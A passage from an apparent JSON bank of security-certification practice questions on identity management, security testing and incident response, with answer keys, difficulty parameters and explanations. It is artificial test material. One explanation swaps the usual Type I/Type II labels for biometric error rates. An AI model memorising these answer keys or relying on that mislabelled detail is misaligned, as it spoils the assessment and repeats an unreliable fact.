      "stem": "A partner company needs to allow its employees to access a shared business application using their existing corporate credentials, without creating duplicate accounts. The solution uses XML-based assertions to pass authentication information between organizations. What technology is being described?",
      "choices": [
        "OpenID Connect (OIDC) identity layer",
        "Kerberos cross-realm authentication",
        "Security Assertion Markup Language (SAML) 2.0 federation",
        "OAuth 2.0 authorization framework"
      ],
      "correctIndex": 2,
      "difficulty": 0.7,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Security Assertion Markup Language (SAML) 2.0 federation. SAML uses XML-based assertions to communicate authentication and authorization data between an Identity Provider (IdP) and a Service Provider (SP), enabling cross-organizational SSO without duplicate accounts. OAuth 2.0 is an authorization delegation framework, not an identity federation protocol. OIDC is a JSON-based identity layer built on top of OAuth 2.0. Kerberos is a ticket-based protocol used within a single domain or trusted realms, not for cross-organization web federation."
    },
    {
      "id": "d5-q7",
      "domain": "5 Identity and Access Management",
      "stem": "A developer builds a mobile app that allows users to grant the app access to their calendar data stored in a third-party service, without sharing their password with the app. The user can revoke this access at any time. Which protocol enables this delegation model?",
      "choices": [
        "OAuth 2.0",
        "RADIUS",
        "LDAP",
        "SAML 2.0"
      ],
      "correctIndex": 0,
      "difficulty": 0.6,
      "discrimination": 1.1,
      "explanation": "Correct Answer: OAuth 2.0. OAuth 2.0 is an authorization delegation framework that allows users to grant third-party applications scoped access to their resources (calendar, contacts, etc.) using access tokens — without sharing passwords. SAML is for enterprise SSO using XML assertions. LDAP is a directory access protocol for querying directory services. RADIUS is an AAA protocol for network access authentication."
    },
    {
      "id": "d5-q8",
      "domain": "5 Identity and Access Management",
      "stem": "A company's privileged access management (PAM) solution automatically rotates passwords for all administrative accounts every 8 hours and requires a checkout workflow for any privileged session. What risk does this MOST directly address?",
      "choices": [
        "Unauthorized application deployments by developers",
        "Lateral movement through standard user accounts",
        "Credential theft and insider misuse of standing privileged access",
        "Phishing attacks against non-privileged users"
      ],
      "correctIndex": 2,
      "difficulty": 0.8,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Credential theft and insider misuse of standing privileged access. Automatic credential rotation eliminates standing passwords that could be stolen and reused, while the checkout workflow creates accountability and limits the window of privileged access. PAM directly addresses both external credential theft and insider threat for privileged accounts. Developer deployments, phishing, and lateral movement through standard accounts are addressed by different controls."
    },
    {
      "id": "d5-q9",
      "domain": "5 Identity and Access Management",
      "stem": "A new employee joins the engineering department. As part of onboarding, she is provisioned with access to the code repository, project management tools, and development servers. Six months later she transfers to marketing. Her engineering access is not removed. What identity lifecycle failure has occurred?",
      "choices": [
        "Access recertification failure — annual review was not completed",
        "Mover event not processed — access was not updated upon role change",
        "Joiner event misconfiguration — initial access grants were incorrect",
        "Leaver event not processed — the account was not deprovisioned"
      ],
      "correctIndex": 1,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Mover event not processed — access was not updated upon role change. The joiner-mover-leaver (JML) framework addresses identity lifecycle. A 'mover' event occurs when an employee changes roles — old access should be revoked and new role-appropriate access provisioned. A 'leaver' event applies to departures. The joiner event was completed (initial access was provisioned). An access recertification review would catch this, but the root cause is the unprocessed mover event."
    },
    {
      "id": "d5-q10",
      "domain": "5 Identity and Access Management",
      "stem": "An airport deploys biometric gates using iris scanning to verify traveler identity at border control. A traveler claims the system incorrectly rejected their valid iris scan. Which biometric error type does this represent?",
      "choices": [
        "False Rejection Rate (FRR) — a legitimate user was incorrectly denied",
        "Crossover Error Rate (CER) — the threshold is set at the equilibrium point",
        "Throughput rate — the system processed too few travelers per hour",
        "False Acceptance Rate (FAR) — an illegitimate user was incorrectly granted access"
      ],
      "correctIndex": 0,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: False Rejection Rate (FRR) — a legitimate user was incorrectly denied. FRR (Type II error) measures how often valid users are rejected. FAR (Type I error) measures how often imposters are incorrectly accepted — the more dangerous error for security. The CER (EER) is the point where FAR = FRR, used to compare biometric system accuracy. Throughput rate is a performance, not accuracy, metric."
    },
    {
      "id": "d5-q11",
      "domain": "5 Identity and Access Management",
      "stem": "A company implements SSO so that employees authenticate once and access all internal applications without re-entering credentials. What is the PRIMARY security risk introduced by SSO?",
      "choices": [
        "Browser-based SSO cannot support multi-factor authentication",
        "Single point of failure — compromise of the SSO credential grants access to all connected applications",
        "Increased password reuse across all applications",
        "Reduced audit trail because fewer authentication events are logged"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Single point of failure — compromise of the SSO credential grants access to all connected applications. SSO's main security risk is that one stolen credential unlocks all systems. This is mitigated by requiring strong MFA for SSO authentication. SSO reduces password reuse (not increases it). SSO systems generate detailed audit logs. Modern SSO platforms (SAML, OIDC) fully support MFA."
    },
    {
      "id": "d5-q12",
      "domain": "5 Identity and Access Management",
      "stem": "An organization adopts a zero trust identity model. When a user with a valid session token accesses a sensitive financial system from the same device they normally use, but the device's security posture has degraded (antivirus definitions are 14 days out of date), what should the policy engine do?",
      "choices": [
        "Allow access because the user has a valid session token",
        "Deny or restrict access until the device posture is remediated, regardless of valid session token",
        "Alert the SOC and allow access while investigation proceeds",
        "Allow access because the device is the user's registered device"
      ],
      "correctIndex": 1,
      "difficulty": 1.0,
      "discrimination": 1.25,
      "explanation": "Correct Answer: Deny or restrict access until the device posture is remediated, regardless of valid session token. Zero trust evaluates trust continuously, incorporating device posture as a key signal. An out-of-date device represents elevated risk — the policy engine should enforce access restrictions until posture is compliant. A valid session token alone does not override zero trust posture requirements. Allowing access and alerting retrospectively defeats the continuous verification principle."
    },
    {
      "id": "d5-q13",
      "domain": "5 Identity and Access Management",
      "stem": "An organization uses an enterprise directory service for internal identity management and integrates it with a cloud application using LDAP over SSL. What is the MOST significant concern with this integration approach?",
      "choices": [
        "Enterprise directory services cannot support cloud application integration",
        "LDAP credentials may be exposed if the SSL configuration is weak or misconfigured",
        "Cloud applications cannot read enterprise directory attributes",
        "LDAP does not support group membership queries"
      ],
      "correctIndex": 1,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: LDAP credentials may be exposed if the SSL configuration is weak or misconfigured. LDAP transmits credentials; without properly configured LDAPS (LDAP over SSL/TLS), they can be intercepted. Even with LDAPS, weak certificate validation or expired certificates create exposure. Enterprise directory services support cloud application integration via LDAP. LDAP supports group membership queries. Cloud apps routinely read directory attributes via LDAP."
    },
    {
      "id": "d5-q14",
      "domain": "5 Identity and Access Management",
      "stem": "A privileged user requires temporary elevated access to a production database to perform emergency maintenance. Rather than having standing admin credentials, they request access through a just-in-time (JIT) provisioning system that grants a time-limited credential valid for 2 hours. What security principle does JIT access MOST directly implement?",
      "choices": [
        "Least privilege — limiting access to only what is needed, for only as long as it is needed",
        "Separation of duties — dividing responsibilities across multiple individuals",
        "Defense in depth — layering multiple controls to protect the system",
        "Need to know — granting access based on job function requirements"
      ],
      "correctIndex": 0,
      "difficulty": 0.9,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Least privilege — limiting access to only what is needed, for only as long as it is needed. JIT access is a temporal application of least privilege — eliminating standing privilege by granting access only when needed and automatically revoking it after a defined window. Separation of duties divides tasks across people. Need to know governs what information is accessed. Defense in depth involves multiple layered controls."
    },
    {
      "id": "d5-q15",
      "domain": "5 Identity and Access Management",
      "stem": "An attacker uses a list of email/password combinations leaked from a gaming site breach to attempt login to a banking application. Many attempts succeed because users reuse passwords across sites. What attack technique is being used and what is the BEST primary control?",
      "choices": [
        "Password spraying; mitigated by complex password requirements",
        "Credential stuffing; mitigated by MFA and breach password screening at login",
        "Phishing; mitigated by user awareness training",
        "Brute force attack; mitigated by account lockout policies"
      ],
      "correctIndex": 1,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Credential stuffing; mitigated by MFA and breach password screening at login. Credential stuffing uses known valid credentials from other breaches — unlike brute force (guessing) or spraying (one password against many accounts). MFA prevents access even with valid credentials. Checking passwords against known breach databases (e.g., HaveIBeenPwned API) detects and blocks reused compromised credentials. Account lockout is ineffective against stuffing because each attempt uses a different username."
    },
    {
      "id": "d5-q16",
      "domain": "5 Identity and Access Management",
      "stem": "A payroll administrator can both initiate and approve their own expense reimbursements in the financial system. What security control failure does this represent?",
      "choices": [
        "Need to know — the user has access to data beyond their role",
        "Least privilege — the user has more access than their role requires",
        "Dual control — two people should perform the action simultaneously",
        "Separation of duties — the same person performs incompatible functions"
      ],
      "correctIndex": 3,
      "difficulty": -0.4,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Separation of duties — the same person performs incompatible functions. Separation of duties (SoD) requires that no single person can complete a sensitive transaction end-to-end — initiation and approval should be performed by different individuals to prevent fraud. Least privilege addresses the scope of access, not incompatible function combinations. Dual control requires simultaneous participation of two people for a single action. Need to know governs data access, not function separation."
    },
    {
      "id": "d6-q1",
      "domain": "6 Security Assessment and Testing",
      "stem": "A penetration tester has just completed reconnaissance and identified open ports, running services, and OS fingerprints on the target. What is the NEXT phase of a structured penetration test?",
      "choices": [
        "Reporting — document findings discovered during reconnaissance",
        "Maintaining access — install backdoors on discovered systems",
        "Exploitation — immediately attempt to compromise identified services",
        "Scanning and enumeration to enumerate users, shares, and vulnerability details"
      ],
      "correctIndex": 3,
      "difficulty": 0.1,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Scanning and enumeration to enumerate users, shares, and vulnerability details. The standard penetration testing phases are: Planning/Reconnaissance → Scanning/Enumeration → Exploitation → Post-Exploitation/Maintaining Access → Reporting. After initial reconnaissance identifies open ports and services, the tester enumerates further details (user accounts, network shares, specific vulnerability versions) before attempting exploitation. Jumping to exploitation skips critical enumeration. Reporting comes at the end. Backdoor installation is a post-exploitation activity."
    },
    {
      "id": "d6-q2",
      "domain": "6 Security Assessment and Testing",
      "stem": "A quality assurance engineer is assigned to test a web application with no knowledge of the source code or internal architecture — only the login URL and basic documentation. What type of testing is she performing?",
      "choices": [
        "White-box testing",
        "Gray-box testing",
        "Static analysis testing",
        "Black-box testing"
      ],
      "correctIndex": 3,
      "difficulty": -0.7,
      "discrimination": 0.95,
      "explanation": "Correct Answer: Black-box testing. Black-box testing provides no internal knowledge — the tester operates with only external access, simulating an outside attacker's perspective. White-box testing gives full access to source code and architecture. Gray-box testing provides partial knowledge (e.g., API documentation and limited code access). Static analysis examines code without execution and requires source code access."
    },
    {
      "id": "d6-q3",
      "domain": "6 Security Assessment and Testing",
      "stem": "A security manager asks for a comparison between vulnerability scanning and penetration testing. Which statement BEST distinguishes the two?",
      "choices": [
        "Vulnerability scanning is more thorough because it covers all systems simultaneously",
        "Penetration testing is performed annually; vulnerability scanning is a one-time activity",
        "Penetration testing is automated; vulnerability scanning requires manual effort",
        "Vulnerability scanning identifies potential weaknesses automatically; penetration testing actively exploits them to confirm impact"
      ],
      "correctIndex": 3,
      "difficulty": -0.3,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Vulnerability scanning identifies potential weaknesses automatically; penetration testing actively exploits them to confirm impact. Vulnerability scanning uses automated tools to detect known vulnerabilities (false positives possible). Penetration testing actively exploits findings to demonstrate real-world impact and confirm exploitability. Pen testing is typically manual or semi-manual. Scanning covers breadth but not depth. Pen testing is often time-bound by scope; scanning can be continuous."
    },
    {
      "id": "d6-q4",
      "domain": "6 Security Assessment and Testing",
      "stem": "A development team runs automated security scans that analyze source code before compilation to detect injection flaws and hardcoded credentials. What type of testing is this?",
      "choices": [
        "Static Application Security Testing (SAST)",
        "Dynamic Application Security Testing (DAST)",
        "Interactive Application Security Testing (IAST)",
        "Runtime Application Self-Protection (RASP)"
      ],
      "correctIndex": 0,
      "difficulty": 0.1,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Static Application Security Testing (SAST). SAST analyzes source code, bytecode, or binaries without executing the application — it runs 'inside out' from the code. DAST tests a running application from the outside, simulating attacks against live endpoints. IAST instruments the running application to monitor it from within during testing. RASP is a runtime protection mechanism that monitors and blocks attacks during production execution."
    },
    {
      "id": "d6-q5",
      "domain": "6 Security Assessment and Testing",
      "stem": "An auditor reviewing a cloud service provider needs assurance that the provider's controls have been operating effectively over a 12-month period, not just at a point in time. Which SOC report type provides this assurance?",
      "choices": [
        "SOC 1 Type I",
        "SOC 2 Type I",
        "SOC 2 Type II",
        "SOC 3"
      ],
      "correctIndex": 2,
      "difficulty": 0.6,
      "discrimination": 1.15,
      "explanation": "Correct Answer: SOC 2 Type II. A SOC 2 Type II report covers the design AND operating effectiveness of controls over a defined period (typically 6–12 months), providing assurance that controls functioned consistently. SOC 2 Type I only assesses control design at a single point in time. SOC 1 addresses controls relevant to financial reporting, not general security. SOC 3 is a public-facing summary without detailed control testing — insufficient for auditor assurance."
    },
    {
      "id": "d6-q6",
      "domain": "6 Security Assessment and Testing",
      "stem": "A CISO wants to demonstrate the security program's effectiveness to the board. She selects metrics including mean time to detect (MTTD), mean time to respond (MTTR), and patch compliance rate. What makes these GOOD security metrics?",
      "choices": [
        "They focus exclusively on technical controls rather than process maturity",
        "They are measurable, tied to operational outcomes, and reflect program effectiveness over time",
        "They demonstrate compliance with a specific regulatory framework",
        "They are easy to collect automatically from SIEM without analyst interpretation"
      ],
      "correctIndex": 1,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: They are measurable, tied to operational outcomes, and reflect program effectiveness over time. Good security metrics are specific, measurable, actionable, relevant, and time-bound (SMART). MTTD, MTTR, and patch compliance directly reflect detection, response, and hygiene effectiveness. Ease of collection is a convenience factor, not a quality indicator. Metrics should balance technical and process dimensions. Compliance metrics are one input but not the full picture of effectiveness."
    },
    {
      "id": "d6-q7",
      "domain": "6 Security Assessment and Testing",
      "stem": "During a log review, a security analyst notices that a privileged administrator account logged in at 2:47 AM on a Saturday, accessed the HR database, and exported 40,000 records before logging out — all within 6 minutes. What should the analyst do FIRST?",
      "choices": [
        "Block the administrator account immediately without further investigation",
        "Document the finding in the change management log and schedule a review",
        "Contact the administrator directly to ask if they performed this activity",
        "Escalate to the incident response team and initiate the incident response process"
      ],
      "correctIndex": 3,
      "difficulty": 0.3,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Escalate to the incident response team and initiate the incident response process. Unusual privileged access at off-hours combined with bulk data export is an indicator of compromise or insider threat — this warrants immediate IR escalation for proper investigation while preserving evidence. Contacting the admin directly could tip off an insider threat or compromise investigation integrity. Immediately blocking without investigation may destroy evidence and lacks due process. Change management is for planned changes, not security incidents."
    },
    {
      "id": "d6-q8",
      "domain": "6 Security Assessment and Testing",
      "stem": "A security engineer submits randomly generated and malformed inputs to a network protocol parser to discover crashes and memory corruption vulnerabilities. What testing technique is being used?",
      "choices": [
        "Fuzzing (fuzz testing)",
        "Boundary value analysis",
        "Regression testing",
        "Equivalence partitioning"
      ],
      "correctIndex": 0,
      "difficulty": 0.7,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Fuzzing (fuzz testing). Fuzzing automatically generates random, malformed, or unexpected inputs and submits them to the target to discover crashes, memory corruption, and unexpected behavior — effective for finding unknown vulnerabilities in parsers, protocols, and file handlers. Regression testing verifies that changes haven't broken existing functionality. Boundary value analysis tests at input boundary conditions. Equivalence partitioning divides inputs into classes and tests one value per class."
    },
    {
      "id": "d6-q9",
      "domain": "6 Security Assessment and Testing",
      "stem": "A code reviewer finds that a developer has implemented custom session token generation using a predictable sequence based on timestamp plus username hash. What vulnerability does this introduce?",
      "choices": [
        "Insecure session token predictability enabling session hijacking",
        "SQL injection risk from improperly sanitized username input",
        "Cross-site request forgery (CSRF) due to missing anti-CSRF tokens",
        "Hardcoded credentials embedded in application source code"
      ],
      "correctIndex": 0,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Insecure session token predictability enabling session hijacking. Session tokens must be generated using a cryptographically secure pseudo-random number generator (CSPRNG). Predictable tokens (based on timestamps or deterministic inputs) allow attackers to enumerate valid session IDs and hijack sessions. CSRF involves forging authenticated requests. SQL injection arises from unsanitized database inputs. Hardcoded credentials are a separate vulnerability class."
    },
    {
      "id": "d6-q10",
      "domain": "6 Security Assessment and Testing",
      "stem": "After deploying a security patch to a web application, the development team re-runs the full test suite to confirm that previously passing security tests still pass. What type of testing is this?",
      "choices": [
        "Integration testing",
        "Acceptance testing",
        "Stress testing",
        "Regression testing"
      ],
      "correctIndex": 3,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Regression testing. Regression testing verifies that a change (patch, update) has not introduced new defects or broken previously working functionality. It re-runs existing tests to confirm baseline behavior is maintained. Acceptance testing validates that the software meets user requirements. Stress testing evaluates behavior under extreme load. Integration testing verifies that components work correctly together."
    },
    {
      "id": "d6-q11",
      "domain": "6 Security Assessment and Testing",
      "stem": "A company hires an internal team to attack their own defenses using real adversary tactics and techniques, while the defensive team responds without prior knowledge of the exercise. What testing model does this describe?",
      "choices": [
        "Tabletop exercise",
        "Purple team exercise",
        "Penetration test with a defined scope",
        "Red team vs. blue team exercise"
      ],
      "correctIndex": 3,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Red team vs. blue team exercise. A red team vs. blue team exercise involves the red team (attackers) using adversary TTPs against the organization while the blue team (defenders) detects and responds without prior notice — testing both offensive and defensive capabilities in a realistic scenario. A purple team exercise involves red and blue working collaboratively and sharing findings in real time. A tabletop exercise is a discussion-based simulation without live attacks. A penetration test is scoped to specific systems and does not typically test the blue team response."
    },
    {
      "id": "d6-q12",
      "domain": "6 Security Assessment and Testing",
      "stem": "An organization launches a public bug bounty program that pays researchers for reporting valid security vulnerabilities in their web application. Researchers must agree to terms of service and are prohibited from accessing user data. What is the PRIMARY security benefit of this program?",
      "choices": [
        "Guaranteed compliance with PCI DSS penetration testing requirements",
        "Continuous, crowdsourced security testing by skilled researchers incentivized to find real vulnerabilities",
        "Elimination of the need for internal penetration testing",
        "Prevention of all application vulnerabilities through external review"
      ],
      "correctIndex": 1,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Continuous, crowdsourced security testing by skilled researchers incentivized to find real vulnerabilities. Bug bounty programs provide ongoing access to a diverse pool of researchers with varied skill sets — finding vulnerabilities that internal teams may miss. They supplement but do not replace structured penetration testing. Bug bounty programs do not automatically satisfy PCI DSS requirements. No program prevents all vulnerabilities."
    },
    {
      "id": "d6-q13",
      "domain": "6 Security Assessment and Testing",
      "stem": "An internal audit team is reviewing access controls and interviewing staff, examining policies, and testing configurations over a defined period. Which type of security assessment is this?",
      "choices": [
        "Vulnerability assessment",
        "Penetration test",
        "Risk assessment",
        "Compliance audit"
      ],
      "correctIndex": 3,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Compliance audit. A compliance audit systematically evaluates whether controls meet defined requirements (policies, standards, regulations) through evidence review, staff interviews, and control testing. A penetration test actively exploits vulnerabilities. A vulnerability assessment scans for technical weaknesses. A risk assessment identifies and evaluates risks — it may inform an audit but is a different activity."
    },
    {
      "id": "d6-q14",
      "domain": "6 Security Assessment and Testing",
      "stem": "A threat hunter proactively searches through months of endpoint telemetry data looking for signs of an advanced persistent threat (APT) that has not triggered any SIEM alerts. What distinguishes threat hunting from traditional SOC monitoring?",
      "choices": [
        "Threat hunting uses only open-source intelligence; SOC uses commercial tools",
        "Threat hunting is hypothesis-driven and proactive; SOC monitoring is reactive and alert-driven",
        "Threat hunting is performed only after a confirmed incident is declared",
        "Threat hunting replaces the need for SIEM in mature organizations"
      ],
      "correctIndex": 1,
      "difficulty": 0.8,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Threat hunting is hypothesis-driven and proactive; SOC monitoring is reactive and alert-driven. Threat hunting assumes compromise may already exist and proactively queries telemetry based on hypotheses about attacker TTPs — not waiting for alerts. SOC monitoring responds to generated alerts. Hunters use any available data sources, not just OSINT. Threat hunting complements SIEM; it doesn't replace it. Hunting occurs before confirmed incidents to find hidden threats."
    },
    {
      "id": "d6-q15",
      "domain": "6 Security Assessment and Testing",
      "stem": "After a red team engagement, the red and blue teams meet to review attack chains, share indicators of compromise, and collaboratively improve detection rules and response playbooks. What collaborative model does this describe?",
      "choices": [
        "Post-incident review",
        "Red team vs. blue team exercise",
        "Tabletop exercise",
        "Purple team exercise"
      ],
      "correctIndex": 3,
      "difficulty": 0.9,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Purple team exercise. A purple team exercise involves the red and blue teams working together — the red team shares TTPs and IOCs while the blue team tests detections and updates playbooks in real time or post-engagement. The goal is knowledge transfer and control improvement, not adversarial blind testing. A red vs. blue exercise keeps teams siloed. A tabletop exercise is discussion-based. A post-incident review examines an actual incident, not an exercise."
    },
    {
      "id": "d7-q1",
      "domain": "7 Security Operations",
      "stem": "A security analyst receives an alert that a critical server is communicating with a known command-and-control IP address. According to NIST SP 800-61, what is the FIRST phase of the incident response process the team should enter?",
      "choices": [
        "Containment — immediately isolate the server from the network",
        "Eradication — remove the malware and close the attack vector",
        "Detection and Analysis — confirm the incident and assess scope",
        "Recovery — restore the server from a known good backup"
      ],
      "correctIndex": 2,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Detection and Analysis — confirm the incident and assess scope. NIST SP 800-61 IR lifecycle: Preparation → Detection and Analysis → Containment, Eradication, and Recovery → Post-Incident Activity. Upon receiving an alert, the first step is Detection and Analysis — confirming that an incident has occurred, determining its scope, and gathering evidence before taking containment actions. Containment follows once the incident is confirmed and understood. Eradication and recovery come after containment."
    },
    {
      "id": "d7-q2",
      "domain": "7 Security Operations",
      "stem": "A digital forensics investigator receives a hard drive from a suspect computer. Before performing any analysis, she creates a cryptographic hash of the drive image. What is the PRIMARY purpose of this action?",
      "choices": [
        "Creating a backup in case the original drive fails",
        "Compressing the image to save storage space",
        "Establishing evidence integrity — proving the evidence has not been modified",
        "Encrypting the evidence to prevent unauthorized access"
      ],
      "correctIndex": 2,
      "difficulty": -0.6,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Establishing evidence integrity — proving the evidence has not been modified. A hash (MD5, SHA-256) of the forensic image creates a digital fingerprint. If the hash matches at a later date, it proves the image has not been altered since acquisition — this supports chain of custody and court admissibility. Hashing does not encrypt, compress, or back up data."
    },
    {
      "id": "d7-q3",
      "domain": "7 Security Operations",
      "stem": "During a ransomware investigation, a forensic analyst needs to examine memory contents to find encryption keys that exist only in RAM. The system is still running. What should she do FIRST?",
      "choices": [
        "Take photographs of the screen and running processes",
        "Power off the system immediately to preserve disk evidence",
        "Acquire a live memory dump before shutting down the system",
        "Remove the hard drive and image it with a write blocker"
      ],
      "correctIndex": 2,
      "difficulty": 0.4,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Acquire a live memory dump before shutting down the system. Volatile memory (RAM) contains data — encryption keys, running processes, network connections — that is lost when the system is powered off. The order of volatility principle dictates capturing volatile data first: RAM → cache → running processes → network state → disk. Powering off destroys volatile evidence. Imaging the hard drive misses RAM contents. Photographs capture visual state but not memory contents."
    },
    {
      "id": "d7-q4",
      "domain": "7 Security Operations",
      "stem": "A SOC deploys a SIEM that aggregates logs from 400 sources and generates 50,000 alerts daily, but only 12 are actionable. Analysts are overwhelmed. What is the BEST approach to improve alert quality?",
      "choices": [
        "Tune detection rules to reduce false positives and implement alert prioritization based on asset criticality and threat intelligence",
        "Add more SOC analysts to handle the increased alert volume",
        "Disable low-confidence rules to reduce total alert count",
        "Switch SIEM vendors to one with better default rules"
      ],
      "correctIndex": 0,
      "difficulty": 0.5,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Tune detection rules to reduce false positives and implement alert prioritization based on asset criticality and threat intelligence. SIEM effectiveness depends on tuning — adjusting thresholds, adding context (asset criticality, threat intel), and correlating events reduces noise and improves signal-to-noise ratio. Adding analysts addresses capacity, not root cause. Disabling rules without analysis could eliminate real detection capability. Vendor switching doesn't address the tuning requirement."
    },
    {
      "id": "d7-q5",
      "domain": "7 Security Operations",
      "stem": "A vulnerability management team discovers that a critical CVE (CVSS 9.8) affecting an internet-facing web server was published 3 weeks ago and has a public exploit available. The server has not been patched. What should be the team's FIRST action?",
      "choices": [
        "Schedule the patch in the next monthly maintenance window",
        "Notify stakeholders that patching will occur in the next quarter",
        "Apply an immediate compensating control (WAF rule, network ACL) while emergency patching is expedited",
        "Perform a full risk assessment before deciding whether to patch"
      ],
      "correctIndex": 2,
      "difficulty": 0.1,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Apply an immediate compensating control (WAF rule, network ACL) while emergency patching is expedited. A CVSS 9.8 critical vulnerability with public exploit on an internet-facing system is an emergency. When immediate patching isn't possible, compensating controls (blocking rules, IP restrictions, WAF signatures) reduce exposure while patching is accelerated. Waiting for the monthly cycle or next quarter with a public exploit available is negligent. A full risk assessment is not appropriate when severity and exploitability are already known."
    },
    {
      "id": "d7-q6",
      "domain": "7 Security Operations",
      "stem": "A change management process requires that all proposed changes be reviewed by a Change Advisory Board (CAB) before implementation. An emergency server patch needs to be applied immediately due to active exploitation. What is the CORRECT procedure?",
      "choices": [
        "Wait for the next scheduled CAB meeting to maintain process integrity",
        "Submit the change through standard channels and escalate priority",
        "Apply the patch without approval since it is an emergency",
        "Follow the emergency change process — obtain expedited approval from authorized individuals and document post-implementation"
      ],
      "correctIndex": 3,
      "difficulty": 0.3,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Follow the emergency change process — obtain expedited approval from authorized individuals and document post-implementation. Most change management frameworks (ITIL, etc.) include an emergency change process that allows urgent changes with expedited approval and post-implementation documentation. Bypassing all approval violates governance. Waiting for CAB during active exploitation creates unacceptable risk. Escalating through standard channels is too slow for active exploitation."
    },
    {
      "id": "d7-q7",
      "domain": "7 Security Operations",
      "stem": "A systems administrator receives a request to deploy a new software package on production servers. Before approving, the change manager checks the current approved configuration baseline. Why is this step critical?",
      "choices": [
        "To confirm that storage capacity is available on the target servers",
        "To verify that the software vendor is on the approved vendor list",
        "To determine whether the change will deviate from the approved configuration and require formal change authorization",
        "To ensure the software license has been purchased"
      ],
      "correctIndex": 2,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: To determine whether the change will deviate from the approved configuration and require formal change authorization. Configuration baselines define the approved, known-good state of systems. Any deviation must go through change management. This ensures configurations are controlled, deviations are authorized, and security baselines are maintained. Vendor lists, licensing, and capacity are important but are separate considerations — the baseline check is specifically about configuration integrity."
    },
    {
      "id": "d7-q8",
      "domain": "7 Security Operations",
      "stem": "A DLP analyst receives a ticket: an employee's quarterly business review presentation was blocked from being emailed to a client. The email contained a slide deck with sample credit card number formats used as placeholder data in a PCI DSS training table. The DLP rule triggered on the pattern match. The employee confirms the data is fictitious and the client meeting is time-sensitive. What should the analyst do NEXT to resolve this without permanently weakening DLP coverage?",
      "choices": [
        "Verify the content is benign, release the specific blocked message with documented justification, then review the DLP rule logic for precision improvements such as context-based or entropy-based refinement",
        "Disable the credit card number DLP rule temporarily until the meeting is complete, then re-enable it afterward",
        "Approve a permanent sender-level exception for the employee so their outbound emails bypass DLP screening going forward",
        "Require the employee to remove the sample data from the presentation, resubmit it, and document the rule as working correctly"
      ],
      "correctIndex": 0,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Release with documented justification and improve rule precision. The appropriate response to a confirmed false positive is: investigate, confirm benign content, release the specific message, document the decision, and use the event to improve rule tuning (contextual analysis, entropy checks, or exemptions for known-good document templates). Disabling the rule creates a protection gap during a window that could be exploited. A permanent sender exception bypasses DLP for that employee entirely — disproportionate to the specific content issue. Requiring removal of placeholder data creates unnecessary friction for legitimate business activity and doesn't improve the rule."
    },
    {
      "id": "d7-q9",
      "domain": "7 Security Operations",
      "stem": "A BCP team is determining when to activate the business continuity plan. The power outage has lasted 90 minutes. The BIA determined that the payroll system has an MTD of 4 hours. What action should the BCP team take?",
      "choices": [
        "Continue monitoring — MTD has not been reached; activate if outage continues toward the 4-hour threshold",
        "Activate the BCP immediately as any outage warrants activation",
        "Wait until the MTD is exceeded before declaring a disaster",
        "Escalate to the board and wait for authorization before any action"
      ],
      "correctIndex": 0,
      "difficulty": 0.6,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Continue monitoring — MTD has not been reached; activate if outage continues toward the 4-hour threshold. At 90 minutes, the organization is within the MTD of 4 hours. BCP activation is a costly decision; it should occur when there is a credible risk of exceeding the MTD — typically activating recovery procedures with enough lead time to meet the RTO before MTD is reached. Activating for any outage is impractical. Waiting until MTD is exceeded guarantees business impact. Board authorization is not required for pre-delegated BCP activation decisions."
    },
    {
      "id": "d7-q10",
      "domain": "7 Security Operations",
      "stem": "A disaster recovery team needs to test whether their recovery procedures actually work without impacting production systems and without requiring a full failover. Which DR test type is MOST appropriate?",
      "choices": [
        "Parallel test — activating the DR site while production continues operating",
        "Checklist review — verifying that DR documentation is current",
        "Tabletop exercise — walking through procedures in a meeting room",
        "Full interruption test — shutting down production and failing over completely"
      ],
      "correctIndex": 0,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Parallel test — activating the DR site while production continues operating. A parallel test brings up the recovery site and tests recovery procedures while the primary site remains operational — allowing real validation without production risk. A full interruption test provides the highest assurance but stops production. A tabletop exercise discusses procedures without activating systems. A checklist review only validates documentation currency, not actual recovery capability."
    },
    {
      "id": "d7-q11",
      "domain": "7 Security Operations",
      "stem": "An e-commerce company's payment database has an RPO of 1 hour. During a ransomware attack, the last clean backup is from 6 hours before detection. What does this indicate about the organization's backup strategy?",
      "choices": [
        "The RPO only applies to the time to recover, not the age of the backup",
        "The backup gap is acceptable if recovery time is within the RTO",
        "The RPO has been met since the backup exists and recovery is possible",
        "The backup strategy fails to meet the RPO — the data loss exceeds what the business can tolerate"
      ],
      "correctIndex": 3,
      "difficulty": 0.4,
